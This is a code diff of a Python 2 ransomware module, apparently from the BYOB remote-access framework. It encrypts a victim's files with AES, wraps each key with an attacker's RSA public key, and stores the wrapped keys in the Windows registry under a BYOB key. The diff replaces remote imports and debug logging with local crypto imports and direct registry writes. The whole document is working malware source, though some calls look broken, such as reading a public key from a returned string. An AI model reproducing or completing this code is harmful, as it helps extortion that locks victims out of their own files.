@@ -15,21 +15,19 @@ import struct
 import base64
 import socket
 import urllib
+import _winreg
 import cStringIO
 import httpimport
 
-# byob
+# cryptography
 
-import util
+import Crypto.Util
+import Crypto.Hash.MD5
+import Crypto.Hash.HMAC
+import Crypto.Cipher.AES
+import Crypto.PublicKey.RSA
+import Crypto.Cipher.PKCS1_OAEP
 
-# remote imports
-
-with httpimport.remote_repo(['Crypto','Crypto.Util','Crypto.Cipher.AES','Crypto.Hash.HMAC','Crypto.Hash.MD5','Crypto.PublicKey.RSA','Crypto.Cipher.PKCS1_OAEP'], base_url='http://localhost:8000'):
-    for module in ['Crypto','Crypto.Util','Crypto.Cipher.AES','Crypto.Hash.HMAC','Crypto.Hash.MD5','Crypto.PublicKey.RSA','Crypto.Cipher.PKCS1_OAEP']:
-        try:
-            exec "import %s" % module
-        except ImportError:
-            util.debug("Error: unable to import '%s'" % module
 
 
 def diffiehellman(connection):
@@ -44,9 +42,9 @@ def diffiehellman(connection):
             x  = pow(xB, a, p)
             return Crypto.Hash.MD5.new(Crypto.Util.number.long_to_bytes(x)).hexdigest()
         except Exception as e:
-            util.debug("{} error: {}".format(diffiehellman.func_name, str(e)))
+            return "{} error: {}".format(diffiehellman.func_name, str(e))
     else:
-        util.debug("{} erorr: invalid input type - expected '{}', received '{}'".format(diffiehellman.func_name, socket.socket, type(connection)))
+        return "{} erorr: invalid input type - expected '{}', received '{}'".format(diffiehellman.func_name, socket.socket, type(connection))
 
 def encrypt_aes(data, key):
     try:
@@ -55,7 +53,7 @@ def encrypt_aes(data, key):
         output = b''.join((cipher.nonce, tag, ciphertext))
         return base64.b64encode(output)
     except Exception as e:
-        util.debug("{} error: {}".format(encrypt.func_name, str(e)))
+        return "{} error: {}".format(encrypt.func_name, str(e))
 
 def decrypt_aes(data, key):
     try:
@@ -64,7 +62,6 @@ def decrypt_aes(data, key):
         cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
         return cipher.decrypt_and_verify(ciphertext, tag)
     except Exception as e1:
-        util.debug("{} error: {}".format(decrypt.func_name, str(e1)))
         try:
             return cipher.decrypt(ciphertext)
         except Exception as e2:
@@ -120,7 +117,7 @@ def encrypt_file(filepath, key):
         else:
             return "File '{}' not found".format(filepath)
     except Exception as e:
-        util.debug("{} error: {}".format(encrypt_file.func_name, str(e)))
+        return "{} error: {}".format(encrypt_file.func_name, str(e))
 
 def decrypt_file(filepath, key):
     try:
@@ -134,7 +131,7 @@ def decrypt_file(filepath, key):
         else:
             return "File '{}' not found".format(filepath)
     except Exception as e:
-        util.debug("{} error: {}".format(decrypt_file.func_name, str(e)))
+        return "{} error: {}".format(decrypt_file.func_name, str(e))
 
 def encrypt_files(args):
     try:
@@ -143,17 +140,11 @@ def encrypt_files(args):
             ransom  = encrypt_file(path, key=aes_key)
             cipher  = Crypto.Cipher.PKCS1_OAEP.new(ransom.pubkey)
             key     = base64.b64encode(cipher.encrypt(aes_key))
-            
-            util.registry_key(ransom, path, key)
-            util.debug('{} encrypted'.format(path))
-            
-            if not len([k for k in workers if 'encrypt-files' in k if workers[k].is_alive()]):
-                rnd = random.randint(1,100)
-                workers['encrypt-files-{}'.format(rnd)] = threading.Thread(target=threader, args=(jobs,), name=time.time())
-                workers['encrypt-files-{}'.format(rnd)].daemon = True
-                workers['encrypt-files-{}'.format(rnd)].start()
+            reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, r'SOFTWARE\BYOB', 0, _winreg.KEY_WRITE)
+            _winreg.SetValueEx(reg_key, path, 0, _winreg.REG_SZ, key)
+            _winreg.CloseKey(reg_key)            
     except Exception as e:
-        util.debug("{} error: {}".format(_encrypt.func_name, str(e)))
+        return "{} error: {}".format(_encrypt.func_name, str(e))
 
 
 def decrypt_files(args):
@@ -162,11 +153,5 @@ def decrypt_files(args):
         cipher  = Crypto.Cipher.PKCS1_OAEP.new(rsa_key)
         aes     = cipher.decrypt(base64.b64decode(aes_key))
         result  = decrypt_file(path, key=aes)
-        util.debug('%s decrypted' % result)
-        if not len([k for k in workers if 'ransom' in k if workers[k].is_alive()]):
-            rnd = random.randint(11,99)
-            workers['decrypt-files-{}'.format(rnd)] = threading.Thread(target=threader, args=(jobs,), name=time.time())
-            workers['decrypt-files-{}'.format(rnd)].daemon = True
-            workers['decrypt-files-{}'.format(rnd)].start()
     except Exception as e:
-        util.debug("{} error: {}".format(decrypt.func_name, str(e)))
+        return "{} error: {}".format(decrypt.func_name, str(e))
